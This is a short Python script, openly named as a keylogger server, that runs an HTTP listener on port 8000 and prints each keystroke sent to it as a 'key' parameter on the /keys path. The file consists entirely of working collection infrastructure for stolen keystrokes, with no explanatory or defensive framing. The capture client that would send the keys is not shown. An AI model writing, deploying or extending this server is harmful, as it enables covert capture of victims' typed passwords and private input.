from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class KeyloggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        if parsed_path.path == '/keys':
            query = urllib.parse.parse_qs(parsed_path.query)
            key = query.get('key', [''])[0]
            if key:
                print(f"Captured key: {key}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

def run(server_class=HTTPServer, handler_class=KeyloggerHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Keylogger server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
